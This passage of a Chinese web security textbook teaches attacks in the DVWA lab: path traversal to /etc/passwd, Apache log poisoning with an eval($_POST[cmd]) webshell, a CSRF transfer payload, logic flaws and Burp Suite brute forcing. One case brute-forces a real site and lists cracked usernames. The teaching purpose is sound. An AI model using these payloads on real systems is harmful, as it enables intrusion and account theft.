- 客户端地址：访问网站的客户端IP地址。

- 访问者的标识：该项一般为空白，用“-”替代。

访问者的验证名称：该项用于记录访问者身份验证时提供的名字，一般情况下，该项也为空。

- 请求的时间：记录访问操作的发生时间。

- 请求类型：该项记录了服务器收到的是什么类型的请求，如 get、post、head 等请求方法。

- 响应的 HTTP 状态码：通过该项信息可以知道请求是否成功，正常情况下，该项值为 200。

- 发送给客户端的字节数：表示发送给客户端的总字节数。

当访问一个不存在的资源时，Apache 日志同样会记录，这就意味着，若网站存在本地包含漏洞，却没有可以包含的文件时（通常指网页木马文件），就可以去访问 http://192.168.10.111/<?php%20phpinfo();?>，如图 9-10 所示。Apache 会记录请求<?phpphpinfo();?>，并写到 access.log 文件中，这时再去包含 apache 的日志文件，不就可以利用包含漏洞了吗？但实际上是不可行的，原因是访问 URL 之后，一句话木马在日志文件中“变形了”。

<table><tr><td>←→G 192.168.10.111/&lt;?php%20phpinfo( );? &gt;</td></tr><tr><td>Not Found
The requested URL /&lt; was not found on this server.</td></tr><tr><td>Apache/2.2.8 (Ubuntu) DAV/2 Server at 192.168.10.111 Port 80</td></tr></table>

![image](MinerU_markdown_Web安全基础教程_assets/image_0097_b3a896f74607.jpg)



图9-10 回显404NotFound



PHP 代码中的“<”“>”空格都被浏览器转码了，这样攻击者就无法正常利用 Apache 包含漏洞，但是可以通过第三方抓包工具，绕过浏览器去提交参数，如图 9-11 所示。


<table><tr><td>GET /&lt;?php phpinfo( );?&gt; HTTP/1.1</td></tr><tr><td>Host: 192.168.10.111</td></tr><tr><td>Cache-Control: max-age=0</td></tr><tr><td>Upgrade-Insecure-Requests: 1</td></tr><tr><td>User-Agent: Mozilla/5.0 (Windows NT 6.1; R0764) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.270-1.103 Safari/537.36</td></tr><tr><td>Accept: text/html,application/zhtml+zml,application/xml;q=0.9,image/webp,*/*;q=0.8</td></tr><tr><td>Accept-Encoding: gzip, deflate, sdch</td></tr><tr><td>Accept-Language: zh-CN,zh;q=0.8</td></tr><tr><td>Cookie: PHPSESSID=227fe03aaa2bf585c6d822b620467c05</td></tr></table>


图 9-11 绕过浏览器提交参数


Apache 日志内容如图 9-12 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0098_871745f25d3d.jpg)



图 9-12 Apache 日志内容


攻击者通过利用存在包含漏洞的页面去包含 access.log，即可成功执行其中的 PHP 代码，如图 9-13 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0099_5e72b607573e.jpg)



图 9-13 成功解析


经过分析，可发现 Apache 的路径是重点，所以在安装 Apache 时，尽量不要使用默认路径。

## 9.2 实战操作

本节通过 DVWA 演示平台，进行一次实战操作，进入 file inclusion 页面。详细操作流程请参考第 9 章视频 9-1。

第一步：确认包含漏洞。

打开相关页面，可以看到浏览器的地址栏链接中含有一个 page 参数，使用../../../../../../etc/passwd 测试一下 page 参数，看是否存在文件包含漏洞，结果如图 9-14 所示，可以成功包含/etc/passwd 文件内容，如图 9-15 所示，说明此参数确实存在包含漏洞。

![image](MinerU_markdown_Web安全基础教程_assets/image_0100_ec04fc134a1f.jpg)



图 9-14 DVWA 文件包含演练位置


<table><tr><td>Damn Vulnerable Web x</td></tr><tr><td>192.168.10.111/dvwa/vulnerabilities/fi/?page=../../../../../../../../../../etc/passwd</td></tr><tr><td>ot:x:0:0:root/root:/bln/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bln:x:2:2:bin:/bin/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync gan:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:Nar/spool/lpd:/bln/sh mall:x:8:8:mail:/var/mall:/bin/sh news:x:9:9:news:/var/spool/news:/bln/sh uucp:x:10 oxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www/bin/sh backup:x:34:34:backup:/var/backup:/bin/sh list:x:38:38:Mailing List Manag hats:x:41:41:Gnats Bug-Reporting System (admin):Var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::Var/lib/lib slog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:nd:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQysql:x:109:118::/MySQL Server,../var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/bin/false userx:100 service:x:1002:1002;../home/service:/bln/bash telnetd:x:112:120::/nonexistent:/bin/false proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534:</td></tr></table>


图 9-15 读取/etc/passwd 文件内容


第二步：针对情况，确定获取权限的方式。

尝试访问日志文件 access.log，构造一句话木马，写入到日志文件名，包含日志文件，获取服务器权限。

通过包含漏洞，构造链接如下：

```html
http://192.168.10.111/dvwa/vulnerabilities/fi/?page=../../../log/apache2/access.log 
```

成功访问 Apache 日志文件，如图 9-16 所示。

<table><tr><td>←→</td><td>192.168.10.111/dvwa/vulnerabilities/fi/?page=../../../log/apache2/access.log</td></tr><tr><td colspan="2">0.10.10.1 -- [25/Jul/2016:11:32:40-0400] GET /mphp?file=http://10.10.10.211/wiki/password.php HTTP/1.1 200 230 - Mozma/5.0 (V)</td></tr><tr><td colspan="2">0.10.10.1 -- [25/Jul/2016:11:32:52-0400] &quot;POST /password.php HTTP/1.1&quot; 404 293 &quot;http://10.10.10.133/m.php?file=http://10.10.10.211/</td></tr><tr><td colspan="2">Gecko/20100101 Firefox/47.0&quot; 10.10.10.1 -- [25/Jul/2016:11:33:09-0400] &quot;POST /password.php HTTP/1.1&quot; 404 293 &quot;http://10.10.10.133/</td></tr><tr><td colspan="2">Windows NT 6.1; WOW64; rv:47.0) Gecko/2010010! Firefox/47.0&quot; 10.10.10.1 -- [25/Jul/2016:11:34:40-0400] &quot;GET /rfi.php?file=http://10.</td></tr><tr><td colspan="2">Windows NT 6.1; WOW64; rv:47.0) Gecko/2010010! Firefox/47.0&quot; 10.10.10.1 -- [25/Jul/2016:11:34:42-0400] &quot;POST /rfi.php?file=http://</td></tr><tr><td colspan="2">http://10.10.10.133/m.php?file=http://10.10.10.211/twiki/filephp.php&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 File</td></tr><tr><td colspan="2">ie=http://10.10.10.211/twiki/filephp.php HTTP/1.1&quot; 200 113 &quot;http://10.10.10.133/m.php?file=http://10.10.10.211/twiki/filephp.php&quot; &quot;Mozilla/</td></tr><tr><td colspan="2">0.10.10.1 -- [25/Jul/2016:11:34:55-0400] &quot;POST /m.php?file=http://10.10.10.211/twiki/filephp.php HTTP/1.1&quot; 200 113 &quot;http://10.10.10.133</td></tr></table>


图 9-16 读取 Apache 日志内容


```txt
http://192.168.10.111/%3C?php%20eval($_POST[cmd]);%3E 
```

绕过浏览器提交参数，如图 9-17 所示。

<table><tr><td>GET /&lt;?php eval ($_POST [cmd]);?&gt; HTTP/1.1</td></tr><tr><td>Host: 192.168.10.111</td></tr><tr><td>Upgrade-Insecure-Requests: 1</td></tr><tr><td>User-Agent: Mozilla/5.0 (Windows NT 6.1; RONOS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2701.103 Safari/537.36</td></tr><tr><td>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</td></tr><tr><td>Accept-Encoding: gzip, deflate, sdch</td></tr><tr><td>Accept-Language: zh-CN,zh;q=0.8</td></tr><tr><td>Cookie: PHPSESSID=d2ff1e1fab7d556d2479c36425c7c283</td></tr><tr><td>Connection: close</td></tr></table>


图 9-17 绕过浏览器提交参数



Apache 日志内容如图 9-18 所示。


<table><tr><td>192.168.10.207 - - [28/Jul/2016:06:47:32 -0400] &quot;GET /&lt;?php eval($_POST[cmd]);?&gt; HTTP/1.1&quot; 404 287 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;</td></tr></table>


图9-18 Apache日志内容


连接相关 WebShell，如图 9-19 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0101_95d5b868b034.jpg)



图 9-19 连接一句话木马


# 其他漏洞（简单介绍）

## 10.1 CSRF 介绍

## 1. CSRF 漏洞说明

CSRF（Cross Site Request Forgery，跨站请求伪造）是一种常见的 Web 攻击，CSRF 在某些时候能产生很大的破坏力。攻击方式主要由攻击者诱导用户点击看似无害的网站链接，一旦用户中招，即可在用户未知的情况下执行某些敏感操作，例如，以用户名义发送邮件、发消息、盗取用户账号，甚至于购买商品，虚拟货币转账等。

## 2. CSRF 漏洞利用方式

CSRF 主要通过伪装来自受信任用户的请求进行攻击，类似 XSS 攻击，两者都是在页面中嵌入特殊部分引诱或强制用户操作从而达到破坏等目的，但它们之间的区别就是 CSRF 迫使用户访问特定 URL，而 XSS 迫使用户执行 JavaScript 代码。

例如，刚刚访问 www.bank.com（银行网站），关闭页面但暂未关闭浏览器，访问银行网站的 Cookie 还会保存在本地，当再次打开，不用输入账号密码即可登录网上银行。这时点击攻击者发来的网站 www.hacker.com，网站可能包含一段转账代码：

```txt
<img src=http://www.bank.com/Transfer.php?toBankId=11&money=100> 
```

这个语句会导致浏览器向银行网站发送一个转账的请求。IMG 标签中，只要 src 字段中规定了 URL，就会按照地址触发这个请求。银行网站服务器收到请求后，认为这是一个更新资源操作（转账行为），所以就立刻进行转账操作，过程如图 10-1 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0102_2310d759b8b6.jpg)



图 10-1 攻击过程


如图 10-2 所示为一般 CSRF 的攻击流程及与 XSS 的对比。

![image](MinerU_markdown_Web安全基础教程_assets/image_0103_70653938815d.jpg)



图 10-2 CSRF 攻击流程


## 3. CSRF 防御

CSRF 为什么能够攻击成功？其本质原因是重要操作的所有参数都是可以被攻击者猜测到的。因此防御 CSRF 可以从随机参数方面着手，防御 CSRF 方式方法很多样，但总的思想都是一致的，就是在客户端页面增加随机数，下面列举一些常用方法。

## (1) Cookie Hashing（所有表单都包含同一个随机值）

这可能是最简单的解决方案了，因为攻击者不能获得第三方的 Cookie，所以表单中的数据也就构造失败了，在表单里增加 Hash 值，以认证这确实是用户发送的请求，然后在服务器端进行 Hash 值验证。

## (2) 验证码

CSRF 攻击的过程，往往是在用户不知情的情况下构建了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终的请求。因此在通常情况下，验证码能够很好地遏制 CSRF 攻击。

但是验证码并非万能，很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为防御 CSRF 的一种辅助手段，而不能作为最主要的解决方案。

## (3) One-Time Tokens (不同的表单包含一个不同的随机值)

在实现 One-Time Tokens 时，需要注意一点，就是“并行会话的兼容”。若用户在一个站点上同时打开了两个不同的表单，CSRF 保护措施不应该影响到它对任何表单的提交。考虑一下若每次表单被载入时站点生成一个随机值来覆盖以前的随机值将会发生什么情况：用户只能成功地提交他最后打开的表单，因为所有其他的表单都含有非法的随机值。

## 10.2 逻辑错误漏洞介绍

## 10.2.1 挖掘逻辑漏洞

所有 Web 应用程序都是通过逻辑实现各种功能，从根本上讲，用编程语言编写代码就是把一个复杂的进程分解成一些非常简单而又相互独立的逻辑步骤，完成一项功能，必须进行周密的逻辑流程安排。但是，很多情况下这些功能逻辑存在缺陷，例如，程序员的安全意识，再例如，考虑问题不周全等。即使是最简单的 Web 应用程序，每个阶段都会执行大量的逻辑操作，这些逻辑操作代表着一个复杂的攻击面，它从没有消失，只是容易被人们忽略。逻辑错误漏洞不能像 SQL 注入和跨站点脚本那种漏洞有明显的特征，因此也难以被扫描器扫描。

逻辑缺陷的本质就是设计者或开发者在思考问题的过程中做出的特殊假设存在明显的或隐晦的错误，简单来说，就是程序员可能这么认为：若逻辑流程中出现 A，就一定会出现 B，因此执行 C。若流程中插入 X 会怎么样？下面就是来谈谈一些常见的逻辑错误。

## 10.2.2 绕过授权验证

每个用户都有相对应的用户权限，当某个用户进行某项操作时产生一个 ID 值，当这个 ID 被其他用户盗用时，即可造成权限绕过问题。

下面以发表文章来说明，一般程序设计的假设都是这样的，A 用户发了一篇文章，这篇文章的地址是 http://www.com/webzhang/A，然后 B 用户发文章，文章的地址是 http://www.com/wenzhang/B。攻击者 B 修改文章时截住数据包，将发表文章的地址修改成 A 的地址，这样服务器若没有其他的检查措施，那么 A 用户的文章就会被 B 用户修改。某公益广告网站存在一个类似的漏洞：

首先在某公益广告网站在注册用户 A 并创建一个广告, 得到广告的 id 为 420, 如图 10-3 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0104_decd441a48a2.jpg)



图 10-3 用户 A 创建广告


然后再注册一个用户 B，用户 B 也创建一个广告，进入修改页面，使用抓包软件捕获数据包，并修改请求，将原本的 id 修改成用户 A 的 id 420，同时也修改内容，如图 10-4 所示。

<table><tr><td>*</td><td colspan="2"></td><td></td></tr><tr><td colspan="4"></td></tr><tr><td colspan="4">Bor</td></tr><tr><td></td><td>Name</td><td colspan="2">Value</td></tr><tr><td>D</td><td>idl</td><td colspan="2">419</td></tr><tr><td></td><td>title</td><td colspan="2">改成B的广告</td></tr><tr><td></td><td>desc</td><td colspan="2">test</td></tr><tr><td></td><td>url</td><td colspan="2">http://weibo.com/ajaxlogin.php?</td></tr><tr><td></td><td>keywords</td><td colspan="2">test</td></tr><tr><td></td><td>start_date</td><td colspan="2">2014-02-20</td></tr><tr><td></td><td>end_date</td><td colspan="2">2014-02-20</td></tr><tr><td></td><td>size_id</td><td colspan="2">25</td></tr><tr><td></td><td>pic</td><td colspan="2">/Public/upload/Ad/111132703.jp</td></tr></table>


图 10-4 用户 B 修改广告


这时候登录 A 用户查看发表的广告已经被修改，如图 10-5 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0105_0e2b22c710d6.jpg)



图 10-5 用户 A 查看广告已被修改


## 10.2.3 密码找回逻辑漏洞

密码找回功能本意是设计给忘记密码的用户，以便他们能够找回自己的密码。一般的假设都是这样的：首先账号绑定了一个手机或邮箱，然后找回密码，输入自己的账号，之后会发送一封邮件到用户邮箱账号上，用户打开邮箱即可重置密码。但存在一个典型的逻辑问题：用户修改密码时不需要提供当前密码，如下面的实例：

JeeCMS 存在任意密码找回漏洞，在用户登录页面单击 “找回密码”，然后输入用户名并单击 “下一步” 按钮，显示找回密码界面，如图 10-6 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0106_f22b7291fd3f.jpg)



图10-6 找回密码界面


这时查看源代码，可以看到用户名对应的邮箱地址，如图 10-7 所示。

```html
</dd>
<dt>邮箱地址：</dt>
    <dd><label class="label-color-1" style="display:inline">54@sina.com"/>
    <input type="hidden" id="mailAddress" name="mailAddress" value="54@sina.com"/>&nbsp;
    <span id="mailerror" class="message-error" style="display:none">邮箱格式不正确，请重新输入！
    <span id="mailwrong" class="message-error" style="display:none">该邮箱不是您注册时输入的邮箱；'
    <dt>验证码：</dt>
    <dd><input id="validCode" name="validCode" type="text" size="9" maxlength="8" value="" onfocus=
```


图 10-7 查看邮箱地址


输入验证码并用抓包软件截获数据包，替换自己的邮箱地址，如图 10-8 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0107_6ad5285eb073.jpg)



图 10-8 修改找回密码的邮箱地址


打开自己的邮箱，点击邮箱收到的链接即可重置密码，如图 10-9 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0108_c8450fc5edf5.jpg)



图 10-9 成功截取 admin 修改密码的邮件


## 10.2.4 支付逻辑漏洞

在一些交易网站上，开发者一般的设计是这样的：用户购买商品，然后根据价格得到一个总价，再根据总价来扣钱。但若逻辑处理不当，会出现很多问题，若用户购买的商品是负数，那么计算的总计就是负数了，这样的话，系统的处理就会反给钱给用户。

Destoon 是一套 B2B 的购物管理系统，该套系统存在支付逻辑漏洞。成功部署之后，选择一个商品进行购买，如图 10-10 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0109_491f006cc402.jpg)



图 10-10 购买商品


选择购买数量时用抓包软件捕获数据包，修改数量为负数，如图 10-11 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0110_bc9df0adebe1.jpg)



图 10-11 修改购买数量



发送后，因为数量为负，系统会自动打钱给用户，如图 10-12 所示。


<table><tr><td>商务中心
Mianke.com</td><td colspan="4">会员服务 信息管理 交易管理 商保管理 网购首页</td></tr><tr><td>员服务</td><td colspan="4">认证： 邮件 手机 银行 实名 公司</td></tr><tr><td>内信件 发信</td><td colspan="4">信件：1封未读站内信 洞价 | 报价 | 留言 | 信使 | 发信</td></tr><tr><td>内交谈 查看</td><td colspan="4">资金：298.00元可用（0.00元锁定） 资金流水 | 提现</td></tr><tr><td>的商友 添加</td><td rowspan="2" colspan="4">积分：31 积分记录 | 购买积分 | 推广随积分 | 积分换礼</td></tr><tr><td>机收藏 添加</td></tr><tr><td>商务中心
Mianke.com</td><td colspan="4">会员服务 信息管理 交易管理 商保管理 网购首页</td></tr><tr><td>员服务</td><td colspan="4">认证： 邮件 手机 银行 实名 公司</td></tr><tr><td>内信件 发信</td><td colspan="4">信件：1封未读站内信 洞价 | 报价 | 留言 | 信使 | 发信</td></tr><tr><td>内交谈查看</td><td rowspan="2" colspan="4">资金：11298.00元可用（0.00元锁定） 资金流水 | 提现</td></tr><tr><td>的商友 添加</td></tr><tr><td>机收藏 添加</td><td colspan="4">积分：31 积分记录 | 购买积分 | 推广随积分 | 积分换礼</td></tr><tr><td>易提醒 添加</td><td rowspan="2" colspan="4">订单：0 收到的订单(卖) | 发出的订单(买) | 团购订单 | 购物车(0)</td></tr><tr><td>牛订阅 电邮</td></tr></table>


图 10-12 系统返还钱给用户


## 10.2.5 指定账户恶意攻击

网站的业务功能与安全策略有可能是对立的，例如，某竞拍网站为了对抗密码暴力破解，规定短时间内账户登录失败5次，就锁定该账号一段时间。但该网站的业务中，核心功能是商品拍卖，注册用户可以给喜欢的商品出价，后来者必须给出一个更高的价格。在拍卖时间截止后，商品将为出价高者所得到。

这其中存在明显的逻辑问题，就是账户被恶意攻击导致拍卖作废的问题。某攻击者在给商品出价后，在网站上继续观察谁出了一个更高的价格，当发现有人出价更高时，就去恶意登录这个用户的账号，当登录失败次数达到5次，该账号就被锁定，该账号所出的价格也作废，因此该黑客可以用最低的价格拍卖得到想要的商品。

## 10.3 URL 跳转与钓鱼

## 1. URL 跳转漏洞说明

由于对网站应用越来越多的需要和第三方应用交互，以及在自身应用内部根据不同的逻辑将用户引向不同的页面，譬如一个典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中若实现不好就可能导致 URL 跳转漏洞。主要原因是服务端未对传入的跳转 URL 变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。

## 2. URL 跳转漏洞实例

对于 URL 跳转的实现一般会有几种实现方式:

(1) META 标签内跳转。

(2) JavaScript 跳转。

(3) header 头部跳转。

通过以 GET 或者 POST 的方式接收将要跳转的 URL, 然后通过上面的几种方式的其中一种来跳转到目标 URL。一方面, 由于用户的输入会进入 Meta, JavaScript, http 头部, 所以都可能发生相应上下文的漏洞, 如 XSS 等。但是同时, 即使只是对于 URL 跳转本身, 功能方面就存在一个缺陷, 因为会将用户浏览器从可信的站点导向到不可信的站点, 同时, 若跳转时带有敏感数据, 一样可能将敏感数据泄露给不可信的第三方。

如下面的实例：访问百度的链接，可直接跳到 ip138 页面中，如图 10-13 所示。

```txt
http://m.baidu.com/1=2/tc?src=http://www.ip138.com 
```

![image](MinerU_markdown_Web安全基础教程_assets/image_0111_d55bc198dea7.jpg)



图 10-13 URL 跳转测试


## 3. 网络钓鱼

网络钓鱼（Phishing）攻击者利用欺骗性的电子邮件和伪造的 Web 站点来进行网络诈骗活动，受骗者往往会泄露自己的私人资料，如信用卡号、银行卡账户、身份证号等内容。诈骗者通常会将自己伪装成网络银行、在线零售商和信用卡公司等可信的品牌，骗取用户的私人信息。

网络钓鱼的主要手法有：

（1）发送电子邮件，以虚假信息引诱用户中圈套。

（2）建立假冒网上银行、网上证券网站，骗取用户账号密码实施盗窃。

（3）利用虚假的电子商务进行诈骗。

（4）利用木马和黑客技术等手段窃取用户信息后实施盗窃活动。

## 4. 利用 URL 跳转进行钓鱼攻击

URL 跳转漏洞适合用于网络钓鱼，由于是从可信的站点跳转出去的，用户会比较信任。通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易。

以百度 MP3 页面为例:

百度 MP3 网站存在 URL 跳转漏洞，被用于进行钓鱼攻击，如图 10-14 所示，攻击者向 QQ 群发送虚假消息，诱骗受害者点击。

![image](MinerU_markdown_Web安全基础教程_assets/image_0112_e5965fdf74ea.jpg)



图 10-14 诱骗用户点击


攻击者通过内嵌框架（iFrame）腾讯网页作为钓鱼背景，当受害者打开其中的链接并登录，将会被攻击者盗取QQ账号及密码，如图10-15所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0113_a749a6d3ec78.jpg)



图 10-15 钓鱼网站


## 10.4 实战操作

本节将使用 DVWA 漏洞测试平台的 CSRF 漏洞模块进行实战操作演示。详细操作流程请参考第 10 章视频 10-1。

进入 DVWA 漏洞演示平台，如图 10-16 所示，选择 CSRF 漏洞模块。

![image](MinerU_markdown_Web安全基础教程_assets/image_0114_95f545375d20.jpg)



图 10-16 CSRF 漏洞页面


该页面为修改密码操作，现在模拟管理员进行密码修改，因 DVWA 使用明文传输，因此可以截获在互联网传输修改密码的数据包，如图 10-17 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0115_0a96b8ff529b.jpg)



图 10-17 抓取修改密码的数据包


管理员修改密码的链接如下：

```txt
http://192.168.10.200/DVWA/vulnerabilities/csrf/?password_current=abc&password_new=admin&password_conf=admin&Change=Change 
```

现在修改其中的密码并发送给管理员点击，即可在管理员不知情的情况下修改其密码，如图 10-18 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0116_d66cbcff8578.jpg)



图 10-18 密码修改成功


更多实战请详见附件中的视频内容。

## 暴力破解

## 11.1 暴力破解概述

暴力破解，通俗来讲就像你有一大串钥匙，需要逐个尝试从而找到可以开门的那把钥匙。在这里，一大串钥匙指的是组成密码的数字、大小写字母、特殊符号的排列组合，可以开门的那把钥匙就是正确的排列。一般为了节省时间，通常会准备好常见的密码排列组合，也就是密码字典来进行暴力破解尝试。

## 11.2 Burp Suite

Burp Suite 是一个用于攻击 Web 应用程序的集成平台，里面集成不同功能的工具。所有的工具都共享一个能处理并显示 HTTP 消息、持久性、认证、代理、日志、警报的一个强大的可扩展的框架。

## 11.2.1 Proxy

Proxy 模块是 Burp Suite 的核心模块，主要用于拦截 HTTP 请求及响应，在拦截 HTTP 请求之前需要对浏览器的代理进行设置。Burp Suite 默认的配置信息在 Options 标签页中。

第一步：查看 Burp Suite 监听的端口，如图 11-1 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0117_1d345d651a9e.jpg)



图 11-1 Burp Suite 监听端口设置


第二步: 浏览器设置 HTTP 代理为 Burp Suite 监听的端口, 这里以 Firefox 浏览器为例, 如图 11-2 和图 11-3 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0118_825a168e26a2.jpg)



图 11-2 FireFox 浏览器设置 HTTP 代理


![image](MinerU_markdown_Web安全基础教程_assets/image_0119_c09202a67799.jpg)



图 11-3 设置 HTTP 代理为 Burp Suite 监听的 IP 和端口


第三步：Proxy 的简单应用。

访问一个 HTTP 协议的网站 http://www.mgtv.com/, 可以看到 Proxy 中已经捕捉到请求, 如图 11-4 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0120_f27e45bcb916.jpg)



图 11-4 Proxy 拦截 HTTP 请求


从图 11-4 可看到 Proxy 的 Intercept 标签页中对应有 4 个选项按钮，下面分别讲解。

- Forward: 将当前 Proxy 拦截到的数据包进行转发。

○ Drop: 将当前 Proxy 拦截到的数据包进行丢弃。

○ Intercept is on: 单击之后，将会关闭 Burp Suite 的拦截功能。但是所有 HTTP 请求都还是经过 Burp Suite，可以在 HTTP history 标签页看到。

○ Action: 可进行其他更多的操作，发送到 Intruder 等其他 Burp Suite 模块，以便进行重复测试或者暴力破解。

第四步：单击 Forward 按钮之后，在 HTTP history 中将会记录下这个 HTTP 请求以及请求对应的响应，如图 11-5 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0121_7b897f56832b.jpg)



图11-5 HTTP history记录下的HTTP请求


上面 4 个步骤讲解了 Burp Suite 中的 Porxy 模块常见的用法。这里总结一下，Options 标签页可用于设置或者查看 Burp Suite 监听的 ip 以及端口情况；Intercept 标签页用于对一个 HTTP 请求进行操作; HTTP history 标签页用于记录下经过 Burp Suite 的 HTTP 请求以及返回的 HTTP 响应。

## 11.2.2 Intruder

Intruder 模块是 Burp Suite 用来进行模糊测试时常用的一个模块。暴力破解也属于模糊测试中的一种。下面介绍 Intruder 的常见用法。

第一步：清除所有的变量标记，为之后设定需要的变量标记做准备，如图 11-6 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0122_8b2aa60d5210.jpg)



图 11-6 清除所有变量标记


第二步：设置变量标记，选定 password 的内容进行标记，如图 11-7 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0123_0fc80044750c.jpg)



图 11-7 设置变量标记


第三步：为变量设置 Payload 类型，根据不同类型的 Payload 进行不同的设置，常见的是 Simple list，表示的是列表类型，密码字典使用的就是列表类型。单击下面的 Load 按钮，在硬盘上选择所需的密码字典文件即可，注意密码字典的路径不要包含中文，如图 11-8 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0124_f984aad99cdc.jpg)



图11-8 设置变量标记的Payload


第四步：设置完毕之后，即可在 Intruder 菜单中选择 Start attack 命令，让 Intruder 进行暴力破解的尝试，如图 11-9 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0125_47d60aab882d.jpg)



图 11-9 使用 Intruder 进行暴力破解


## 11.3 暴力破解案例

案例一：

某古玩网站登录处没有验证码限制。采用国人姓名拼音 top500 以及拼音缩写作为字典，密码和用户名一致，同样是姓名拼音以及拼音缩写。输入用户名和密码，如图 11-10 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0126_47669435fcf9.jpg)



图 11-10 输入用户名和密码



抓取登录时的数据包，单击 Action 按钮，发送到 Intruder，如图 11-11 所示。


<table><tr><td colspan="4">Request to http://usercenter.gucn.com:80 [122.192.66.52]</td></tr><tr><td colspan="4">Forward Drop Intercept to on Action</td></tr><tr><td colspan="4">Reply Params Headers Hex</td></tr><tr><td rowspan="16" colspan="3">POST /UserLogin.asp HTTP/1.1
Host: usercenter.gucn.com
Proxy-Connection: keep-alive
Content-Length: 102
Cache-Control: max-age=0
Origin: http://www.gucn.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0, WOW64)
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/x
Referer: http://www.gucn.com/login/sp?fromurl=http
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0,6
Cookie: ASPSESSIONIDAACSASAR=GPGCDFADLDLJB
comeurl=http%3A%2F%2Fwww.gucn.com%2F&amp;UserN</td><td>Send to Spider
Do an active scan</td></tr><tr><td>Send to Inverter Ctrl+R</td></tr><tr><td>Send to Repeater Ctrl+R</td></tr><tr><td>Send to Sequencer</td></tr><tr><td>Send to Comparer</td></tr><tr><td>Send to Decoder</td></tr><tr><td>Request in browser ▷</td></tr><tr><td>Engagement tools ▷</td></tr><tr><td>Change request method</td></tr><tr><td>Change body encoding</td></tr><tr><td>Copy URL</td></tr><tr><td>Copy as curl command</td></tr><tr><td>Copy to file</td></tr><tr><td>Paste from file</td></tr><tr><td>Save item</td></tr><tr><td>Don&#x27;t intercept requests ▷</td></tr></table>


图 11-11 登录数据包发送到 Intruder


设置用户名和密码同为变量，攻击类型选择为 Battering ram，这种攻击类型表示两个变量共用一个 Payload，也就是账号和密码相同，如图 11-12 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0127_f1dbbce134fb.jpg)



图 11-12 添加变量标记


设置 Payload，加载中国人姓名字典，如图 11-13 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0128_573f9203dd77.jpg)



图 11-13 设置 Payload 并加载密码字典


选择 Intruder→Start attack 命令在攻击结束后，可以看到这样的结果：状态码为 302，表示账号和密码正确，登录成功之后进行页面跳转，如图 11-14 所示。

<table><tr><td>Request</td><td>Payload</td><td>Status</td><td>Error</td><td>Timeout</td><td>Length</td><td>v</td><td>Con</td></tr><tr><td>232</td><td>wanghao</td><td>302</td><td></td><td></td><td>1175</td><td></td><td></td></tr><tr><td>260</td><td>yangli</td><td>302</td><td></td><td></td><td>1175</td><td></td><td></td></tr><tr><td>298</td><td>wangshuai</td><td>302</td><td></td><td></td><td>1175</td><td></td><td></td></tr><tr><td>354</td><td>zhangting</td><td>302</td><td></td><td></td><td>1175</td><td></td><td></td></tr><tr><td>443</td><td>liuchang</td><td>302</td><td></td><td></td><td>1175</td><td></td><td></td></tr><tr><td>648</td><td>chenyun</td><td>302</td><td></td><td></td><td>1175</td><td></td><td></td></tr><tr><td>693</td><td>liuhao</td><td>302</td><td></td><td></td><td>1175</td><td></td><td></td></tr><tr><td>743</td><td>wangrong</td><td>302</td><td></td><td></td><td>1175</td><td></td><td></td></tr><tr><td>841</td><td>yangbin</td><td>302</td><td></td><td></td><td>1175</td><td></td><td></td></tr><tr><td>144</td><td>liut</td><td>200</t